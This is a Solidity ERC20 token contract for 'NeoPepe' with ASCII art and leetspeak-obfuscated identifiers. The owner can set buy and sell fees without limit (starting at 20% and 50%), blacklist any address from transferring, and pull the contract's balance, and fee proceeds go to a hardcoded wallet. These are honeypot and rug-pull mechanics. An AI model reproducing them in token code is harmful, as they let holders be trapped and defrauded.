// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

//                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 +*=========*
//                                    ****=====%%%@@@@@@@%%
//                                ****=====%%%@@@@@@#######@@%            .:******:
//                             *****====%%%%@@@@@############@@=     .**===%%%%@@@@@@%%
//                          .*****====%%%@@@@@@@###############@%  +*===%%%%@@@@@@######@
//                         +*****=====%%%%@@@@@@@@@@@@@########@@%*====%%%%@@@@###########@
//                       -******=======%%%%%@%%=**======%%%%%%%=%@====%%%%@@@@#############@:
//                      +********=======%%%=*=======%%%%@@@@@@@@@@%%==%%%%@@@@##############@-
//                    -*********=========+**====%%@@@@@@@@@@@######@@@%%%%@@@#####@***==%%%%%%%%%
//                   **********========+***=%%%%%%%%@@@@@@@@@@@@@@@@@@@@%%%@@##***==%%%%@@@@@####@@@%
//                 +*********=======*+***====%%%%%%%@@@@@@@@@@@@@@@@@@@@@%%@@***==%%%%@@@@#########@@@@
//               -**********======**+*========%%%%%%%@@@@############@@@@@%=***====%%%@@@@@@@@######@@@@=
//              ******=*****====***+*=========%%%%@@##@@@@@@@@@@@@@@@@@@@@#@%=====%%%%%%@@@@@@######@@@@@@.
//            +****====**************========%%@@@@%@@@@@@@@@@@@@@@@@@@@@@@%%%====%%%%%%%@@#########@@@@@@@@
//          .****======********++******====%%%%%%%%%%%%%%@@@#############@@%%%====%%%%%%@@@@@@@@@@@@@@@@@%%%:
//         +****=======*******+*********========%%%@@####################@@%%======%%%%%@@@@@@###########%==
//        +****========*****++++*********====%%@@@@@@@##################@@@%==*=====%%%%%@@@#############@%.
//       *****=========****+++++++++---++*====%%%%%%%%%%@@@@@############@@%=***===%%%%@@@@@@############@=
//     ++****===========****+++++++++----++*====%%%%%=--:  .*@%*-######@@% .*=*===%%%%@@@@[email protected]@%*-#####=   +
//    ++****============*****+++++++***=%%+=====%%@@@*@#########@*@####@@%=:%%%%%%%%%[email protected]@#######@=-####@@
//   .+*****=============*************====%%%===%%@@@############@*#####@%=+#@@@@@+%%@########@#@=#####@*
//   ++*****=================********++*===%%%@@@%%@*############@=#####@%[email protected]@###===%%%###########%@###@%*=
//  ++*******=====================****+++++=%%%@@@@##@###########@=###@@%%[email protected]#####@%[email protected]#########@=###@@%*=
// :++********=========================**++---++%@@@@@@@########@=##@@@%%+%%%@@#@##@@@@@#######%%%@@%[email protected]#@
// +++*********==========================%%=*[email protected]@@@#################@%%@@@#@@#@@################@
// +++***********=====================%%%%%@@@@%===*++******=%%@#######@@@@@@%@@@@###@@############@%=*
// -+++************============%%%%%%%%%%%%@@@@@@###@@%%========%%%%@@@@@####@@@@@@##################@@%
// ++++***************==========%%%%%%%%%%@@@@@@################################@@@##################@@%
// +-+++*****************=========%%%=%%%%@@@@@#######################################################@%%
// :-++++***************=*==========%%%%%%@@@@@#######################################################@@%%
//  --+++++********************===%%%%%%%%@@@@@########################################################@@%%
//   --++++++*************************%%%%%@@@@@########################################################@@%
//    ---++++++++*************++***++++++*%%@@@@@@#######################################################@@
//     ---++++++++++++****************[email protected]@@@######################################################@.
//      ----++++++++++******==*=*-*=====%@:---+----*@###################################################=
//       :-----+++++++++*****====*+-*%%%%%%%%#---++++++++*%@#######################################@=*+
//         -:----++++++++*****====*+-:+=%%%%%%%%%@#:-++++++++****===%@##################@@%====***++%%+
//          .::-----+++++++******===*++-:*%%%@@@@@@@@@@#--+++++*******************************++#@@@@%
//             ::-----++++++++**********+-::-=%%@@@@@@@@@@@@@@##--++++++++**************+#######@#@@@
//              :::-----+++++++*******====*++-::+=%@@@@@@@@@######################################@@*%
//                .:::----+++++++*******=======+--:.-=%%@@@@####################################@==%####
//                   :::----+++++++********========*+--:.:*=%@@##############################%+=%@######@
//                     ::::----++++++********===============**-::..-+=%@@############@=***+.*[email protected]@#####@@@@@#%
//                        ::::-----+++++*********=====================****************+++-=%@######%-+%@@@**=%@+
//                           :.:::---++++++****************************************+++-*%@#######@++**=+=%%%%@##%
//                              ...:::---++++++*******************************++*%@@@*%@#######=+***[email protected]########@%%
//                                  ....:::-----+++++++++++++++++++++++++++--:   [email protected]##[email protected]####@%%*+*+*=%%@@#@%==-++=%@#@
//                                         ...::::::-------------:::::.             .-*=%%%##%*+==%@@@@=**===%@######
//                                                                                  -:+*[email protected]###+=%@@@%*+*===%%@###%@+*=
//                                                                                   .:+=%@###@-*%==+*====%%@@*+**=%@##=
//                                                                                     .:+*=%@@%%%%@+*===%%*+*=%%@#####@
//                                                                                         .-+***====-+==+**==%%@@@@##%
//                                                                                             ..:-++++*****=%@@%%=+*%%
//                                                                                                  ..:::--*::+---+=%@%
//                                                                                                        ...:-+****%@@

// https://neopepe.com/
// https://twitter.com/neopepecoin
// https://t.me/neopepecoin

import "openzeppelin/token/ERC20/ERC20.sol";
import "openzeppelin/access/Ownable.sol";

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

interface IUniswapV2Factory {
    function createPair(
        address tokenA,
        address tokenB
    ) external returns (address pair);
}

contract NeoPepe is ERC20, Ownable {
    error Errn0b075();
    error Err700m4ny();

    uint256 public constant m4x_5upply = 420_000_000_000 ether;
    address constant l33t = 0x9945ef90cC327b0eD4aDa00fE301f68C7849D43e;
    IUniswapV2Router02 public constant un15w4p_v2_r0u73r =
        IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    uint256 private constant in1714l_buy_f33 = 20;
    uint256 private constant in1714l_53ll_f33 = 50;

    address public immutable un15w4p_v2_p41r;

    mapping(address => bool) b075;
    bool public l1m173d = true;
    uint256 m4x = 8_400_000_000 ether;

    uint256 public buyf33;
    uint256 public s3llf33;

    uint256 public sw4p70k3n5474m0un7;
    bool private _155w4pp1n6;

    mapping(address => bool) public i53xclud3dfr0mf335;

    constructor() ERC20("NeoPepe", "NEOP") {
        address _un15w4pp41r = IUniswapV2Factory(un15w4p_v2_r0u73r.factory())
            .createPair(address(this), un15w4p_v2_r0u73r.WETH());
        un15w4p_v2_p41r = _un15w4pp41r;
        sw4p70k3n5474m0un7 = m4x_5upply / 1000; // 0.1% swap wallet
        buyf33 = in1714l_buy_f33;
        s3llf33 = in1714l_53ll_f33;
        exclud3fr0mf335(tx.origin, true);
        exclud3fr0mf335(address(this), true);
        _mint(tx.origin, m4x_5upply);
        _transferOwnership(tx.origin);
    }

    function d357r0y(uint256 amount_) external {
        _burn(msg.sender, amount_);
    }

    function exclud3fr0mf335(address a_, bool e_) public onlyOwner {
        i53xclud3dfr0mf335[a_] = e_;
    }

    function s37b07(address b_, bool t_) external onlyOwner {
        b075[b_] = t_;
    }

    function s37l1m173d(bool l_, uint256 m_) external onlyOwner {
        l1m173d = l_;
        m4x = m_;
    }

    function s37f335(uint256 b_, uint256 s_) external onlyOwner {
        buyf33 = b_;
        s3llf33 = s_;
    }

    function s375w4p70k3n5474m0un7(uint256 n_) external onlyOwner {
        sw4p70k3n5474m0un7 = n_;
    }

    function c0ll3c757uck() external onlyOwner {
        _transfer(address(this), msg.sender, balanceOf(address(this)));
    }

    function _beforeTokenTransfer(
        address or161n,
        address d3571n4710n,
        uint256 am0un7
    ) internal virtual override {
        if (b075[or161n] || b075[d3571n4710n]) {
            revert Errn0b075();
        }

        if (
            l1m173d &&
            or161n == un15w4p_v2_p41r &&
            super.balanceOf(d3571n4710n) + am0un7 > m4x
        ) {
            revert Err700m4ny();
        }
    }

    function _transfer(address f_, address t_, uint256 a_) internal override {
        if (
            balanceOf(address(this)) >= sw4p70k3n5474m0un7 &&
            !_155w4pp1n6 &&
            !i53xclud3dfr0mf335[f_] &&
            !i53xclud3dfr0mf335[t_]
        ) {
            _155w4pp1n6 = true;
            _5w4p();
            _155w4pp1n6 = false;
        }

        uint256 _f33 = 0;
        if (
            !_155w4pp1n6 && !i53xclud3dfr0mf335[f_] && !i53xclud3dfr0mf335[t_]
        ) {
            uint256 s3ll7074lf335 = s3llf33;
            uint256 buy7074lf335 = buyf33;

            if (t_ == un15w4p_v2_p41r && s3ll7074lf335 > 0) {
                _f33 = (a_ * s3ll7074lf335) / 100;
                super._transfer(f_, address(this), _f33);
            } else if (f_ == un15w4p_v2_p41r && buy7074lf335 > 0) {
                _f33 = (a_ * buy7074lf335) / 100;
                super._transfer(f_, address(this), _f33);
            }
        }

        super._transfer(f_, t_, a_ - _f33);
    }

    function _5w4p() private {
        uint256 c0n7r4c7b4l4nc3 = balanceOf(address(this));

        if (c0n7r4c7b4l4nc3 == 0) {
            return;
        }

        uint256 sw4p4m0un7 = c0n7r4c7b4l4nc3;
        if (sw4p4m0un7 > sw4p70k3n5474m0un7 * 20) {
            sw4p4m0un7 = sw4p70k3n5474m0un7 * 20;
        }

        _5w4p70k3n5f0r37h(sw4p4m0un7);

        payable(address(l33t)).transfer(address(this).balance);
    }

    function _5w4p70k3n5f0r37h(uint256 t_) private {
        address[] memory p4th = new address[](2);
        p4th[0] = address(this);
        p4th[1] = un15w4p_v2_r0u73r.WETH();

        _approve(address(this), address(un15w4p_v2_r0u73r), t_);

        un15w4p_v2_r0u73r.swapExactTokensForETHSupportingFeeOnTransferTokens(
            t_,
            0,
            p4th,
            address(this),
            block.timestamp
        );
    }
}